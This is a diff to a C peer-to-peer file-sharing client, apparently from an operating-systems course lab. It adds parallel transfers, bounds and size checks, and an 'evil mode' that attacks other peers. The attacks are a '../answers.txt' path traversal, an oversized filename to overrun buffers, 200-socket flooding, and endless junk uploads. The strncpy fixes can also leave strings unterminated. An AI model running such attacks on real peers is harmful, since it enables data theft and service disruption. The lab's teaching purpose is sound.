@@ -29,15 +29,19 @@ int evil_mode;			// nonzero iff this peer should behave badly
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
 
-
 /*****************************************************************************
  * TASK STRUCTURE
  * Holds all information relevant for a peer or tracker connection, including
  * a bounded buffer that simplifies reading from and writing to peers.
  */
-
-#define TASKBUFSIZ	4096	// Size of task_t::buf
+				// EXERCISE 2B: increased taskbufsiz
+#define TASKBUFSIZ	32768	// Size of task_t::buf 
 #define FILENAMESIZ	256	// Size of task_t::filename
+
+#define MAXFILESIZ	5242880	// EXERCISE 2B: Max file size - 5 MB
+#define DOSATTACK	200	// EXERCISE 3: # of DoS attacks to send
+int DOS[DOSATTACK];
+char* evil_filename;
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -477,7 +481,9 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* Error while allocating task");
 		goto exit;
 	}
-	strcpy(t->filename, filename);
+
+	// EXERCISE 2A: prevent buffer overrun
+	strncpy(t->filename, filename, FILENAMESIZ);
 
 	// add peers
 	s1 = tracker_task->buf;
@@ -517,6 +523,35 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 
+	if(evil_mode)
+	{
+		// Connect to the peer and attack
+		message("* Connecting to %s:%d to attack '%s'\n",
+			inet_ntoa(t->peer_list->addr), t->peer_list->port,
+			t->filename);
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Cannot connect to peer: %s\n", strerror(errno));
+			goto try_again;
+		}
+
+		// EXERCISE 3: attempt to access priviliged files
+		osp2p_writef(t->peer_fd, "GET ../answers.txt OSP2P\n");
+
+		// EXERCISE 3: buffer overrun attack
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_filename);
+
+		// EXERCISE 3: Denial of Service (DoS) attack
+		int i;
+		for(i = 0; i < DOSATTACK; i++)
+		{
+			DOS[i] = open_socket(t->peer_list->addr, t->peer_list->port);
+			osp2p_writef(DOS[i], "GET cat1.jpg OSP2P\n");
+		}
+
+		goto try_again;
+	}
+
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
@@ -534,7 +569,10 @@ static void task_download(task_t *t, task_t *tracker_task)
 	// at all.
 	for (i = 0; i < 50; i++) {
 		if (i == 0)
-			strcpy(t->disk_filename, t->filename);
+		{
+			// EXERCISE 2A: prevent buffer overrun
+			strncpy(t->disk_filename, t->filename, FILENAMESIZ);
+		}
 		else
 			sprintf(t->disk_filename, "%s~%d~", t->filename, i);
 		t->disk_fd = open(t->disk_filename,
@@ -557,13 +595,21 @@ static void task_download(task_t *t, task_t *tracker_task)
 	// Read the file into the task buffer from the peer,
 	// and write it from the task buffer onto disk.
 	while (1) {
+		// EXERCISE 2B: impose a limit on the file sizes
+		if(t->total_written > MAXFILESIZ)
+		{
+			error("* File too large");
+			goto try_again;
+		}
+
 		int ret = read_to_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer read error");
 			goto try_again;
-		} else if (ret == TBUF_END && t->head == t->tail)
+		} else if (ret == TBUF_END && t->head == t->tail){
 			/* End of file */
 			break;
+		}
 
 		ret = write_from_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -589,6 +635,20 @@ static void task_download(task_t *t, task_t *tracker_task)
 	error("* Download was empty, trying next peer\n");
 
     try_again:
+	if(evil_mode)
+	{
+		// EXERCISE 3: free the DOS sockets
+		int j;
+		for(j = 0; j < DOSATTACK; j++)
+		{
+			if(DOS[j] >= 0)
+			{
+				close(DOS[j]);
+			}
+		}
+	} else
+
+	// normal mode
 	if (t->disk_filename[0])
 		unlink(t->disk_filename);
 	// recursive call
@@ -650,6 +710,13 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
+	// EXERCISE 2B: serve files only from current directory
+	if(memchr(t->filename, '/', FILENAMESIZ) != 0)
+	{
+		error("* Cannot serve file outside of current directory");
+		goto exit;
+	}
+
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
@@ -657,6 +724,16 @@ static void task_upload(task_t *t)
 	}
 
 	message("* Transferring file %s\n", t->filename);
+	
+	// EXERCISE 3: upload infinite data
+	if(evil_mode)
+	{
+		while(1)
+		{
+			osp2p_writef(t->peer_fd, "lol.");
+		}
+	}
+
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
@@ -665,7 +742,17 @@ static void task_upload(task_t *t)
 			goto exit;
 		}
 
-		ret = read_to_taskbuf(t->disk_fd, t);
+		// EXERCISE 3: upload corrupted data
+		/*if(evil_mode)
+		{
+			int evil_fd = open("/dev/random", O_RDONLY);
+			ret = read_to_taskbuf(evil_fd, t);
+		}
+		else
+		{*/
+			ret = read_to_taskbuf(t->disk_fd, t);
+		//}
+
 		if (ret == TBUF_ERROR) {
 			error("* Disk read error");
 			goto exit;
@@ -759,14 +846,18 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
-	// Keep track of downloads in progress.
+	// EXERCISE 1: Keep track of downloads in progress.
 	int dl_child;
 	dl_child = 0;
+
+	// EXERCISE 3: create long filename for buffer overrun
+	evil_filename = (char*)malloc(sizeof(char)*FILENAMESIZ*2);
+	memset(evil_filename, 'z', FILENAMESIZ*2);
 
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++)
 	{
-		// parallel downloads
+		// EXERCISE 1: parallel downloads
 		if ((t = start_download(tracker_task, argv[1])))
 		{
 			pid_t pid;
@@ -791,7 +882,7 @@ int main(int argc, char *argv[])
 		}
 	}
 
-	// wait for all downloads to finish, reap the children
+	// EXERCISE 1: wait for all downloads to finish, reap the children
 	while(dl_child > 0)
 	{
 		waitpid(-1, NULL, 0);
@@ -801,6 +892,7 @@ int main(int argc, char *argv[])
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task)))
 	{
+		// EXERCISE 1: parallel uploads
 		// reap an upload process but do not busy wait
 		waitpid(-1, NULL, WNOHANG);
 		pid_t pid;
